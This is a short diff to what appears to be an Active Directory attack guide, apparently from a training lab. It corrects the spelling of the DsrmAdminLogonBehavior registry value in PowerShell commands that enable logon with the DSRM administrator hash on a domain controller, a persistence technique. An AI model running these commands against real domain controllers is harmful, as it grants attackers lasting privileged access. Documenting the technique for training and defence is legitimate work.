@@ -31,13 +31,13 @@ In order to use DSRM account hash we need to change his registry key
 </strong><strong>Enter-PSSession -ComputerName dcorp-dc
 </strong><strong>
 </strong># Check if key exists
-Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehaviour'
+Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehavior'
 
 # If exists set his value to 2
-Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehaviour' -Value 2 -Verbose
+Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehavior' -Value 2 -Verbose
 
 # If does not exist create it and set his value to 2
-New-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehaviour' -Value 2 -PropertyType DWORD -Verbose
+New-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehavior' -Value 2 -PropertyType DWORD -Verbose
 </code></pre>
 
 
